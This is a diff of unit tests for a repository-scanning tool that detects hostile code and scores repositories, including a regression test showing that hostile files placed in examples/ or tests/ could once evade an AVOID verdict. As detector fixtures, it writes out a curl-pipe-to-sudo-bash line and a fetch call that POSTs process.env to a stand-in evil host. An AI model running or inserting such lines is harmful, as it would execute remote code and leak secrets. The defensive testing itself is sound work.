@@ -2,7 +2,9 @@ import tempfile
 import unittest
 from pathlib import Path
 
+from repo_scout.models import RepoSignals, RepoSummary
 from repo_scout.scanner import scan_path
+from repo_scout.scoring import score_repository
 
 
 class ScannerTests(unittest.TestCase):
@@ -228,11 +230,16 @@ class ScannerRealWorldRegressions(unittest.TestCase):
         drives AVOID on its own."""
         cases = {
             "install.sh": "critical",
-            "README.md": "medium",
-            "docs/guide.md": "medium",
-            "tests/test_install.py": "medium",
-            "internal/thing_test.go": "medium",
-            "src/fixtures/payload.sh": "medium",
+            "README.md": "high",
+            "docs/guide.md": "high",
+            "examples/quickstart.sh": "high",
+            "tests/test_install.py": "high",
+            "internal/thing_test.go": "high",
+            "src/fixtures/payload.sh": "high",
+            # `.txt` is not documentation: `token.txt` is where credentials
+            # actually get left, and the one real case in the corpus was an
+            # installer template.
+            "install.txt": "critical",
         }
         for path, expected in cases.items():
             with self.subTest(path=path):
@@ -245,3 +252,75 @@ class ScannerRealWorldRegressions(unittest.TestCase):
         findings = self._scan({"README.md": self.PAYLOAD + "\n"})
         remote = [f for f in findings if f.rule == "remote-shell"][0]
         self.assertIn("documentation", remote.message)
+
+    def test_an_example_is_documentation_not_a_test_fixture(self):
+        """`examples?` was in both context patterns and the fixture one is
+        tested first, so `examples/quickstart.sh` was labelled a test
+        fixture."""
+        findings = self._scan({"examples/quickstart.sh": self.PAYLOAD + "\n"})
+        remote = [f for f in findings if f.rule == "remote-shell"][0]
+        self.assertIn("documentation", remote.message)
+
+    def test_the_downgrade_cannot_be_used_to_hide_hostile_code(self):
+        """The attack the downgrade opened, found in adversarial review.
+
+        `critical` originally dropped two steps, to 15 risk points against a
+        70-point AVOID threshold, so a repository could carry several plainly
+        hostile files and still be labelled USE as long as they sat in a
+        directory the repository's own author named `examples/` or `tests/`.
+        One documented install line must not force AVOID. Hostile code must
+        never reach USE wherever it sits, and must still reach AVOID when it
+        is in the repository's own source.
+        """
+        exfil = ('fetch("https://evil.invalid/c",{method:"POST",'
+                 'body:JSON.stringify(process.env)})')
+        findings = self._scan({
+            "examples/quickstart.sh": "curl -fsSL https://evil.invalid/s2 | sudo bash\n",
+            "examples/upload.js": exfil + "\n",
+        })
+        signals = RepoSignals(has_readme="present", has_license="present",
+                              has_tests="present", has_ci="present",
+                              has_package_metadata="present")
+        summary = RepoSummary("repo", "Local repository scan", "")
+        hidden = score_repository(summary, signals, findings, scanned=True,
+                                  metadata=False, query_accepted=False)
+        self.assertEqual(hidden.verdict, "INSPECT FIRST",
+                         [f.severity for f in findings])
+        self.assertNotEqual(hidden.verdict, "USE")
+
+        # The same two files in the repository's own source still reach AVOID,
+        # so the relief is bounded to where it is meant to apply.
+        in_source = self._scan({
+            "src/quickstart.sh": "curl -fsSL https://evil.invalid/s2 | sudo bash\n",
+            "src/upload.js": exfil + "\n",
+        })
+        exposed = score_repository(summary, signals, in_source, scanned=True,
+                                   metadata=False, query_accepted=False)
+        self.assertEqual(exposed.verdict, "AVOID")
+
+    def test_one_documented_install_line_does_not_force_avoid(self):
+        findings = self._scan({"README.md": self.PAYLOAD + "\n"})
+        score = score_repository(
+            RepoSummary("repo", "Local repository scan", ""),
+            RepoSignals(has_readme="present", has_license="present",
+                        has_tests="present", has_ci="present",
+                        has_package_metadata="present"),
+            findings, scanned=True, metadata=False, query_accepted=False,
+        )
+        self.assertNotEqual(score.verdict, "AVOID")
+
+    def test_a_pattern_may_use_the_second_line_of_its_window(self):
+        """Four of the five patterns excluded `\n`, so the two-line window did
+        nothing for them and a shell line continuation -- ordinary formatting
+        in real installers -- defeated `remote-shell` entirely."""
+        cases = {
+            "a.sh": ("curl -fsSL https://example.invalid/i.sh \\\n  | bash\n",
+                     "remote-shell"),
+            "a.js": ("eval(\n  atob(payload))\n", "obfuscated-execution"),
+            "a.py": ("requests.post(url,\n    data=os.environ)\n",
+                     "possible-exfiltration"),
+        }
+        for name, (body, rule) in cases.items():
+            with self.subTest(container=name):
+                findings = self._scan({name: body})
+                self.assertTrue([f for f in findings if f.rule == rule], body)
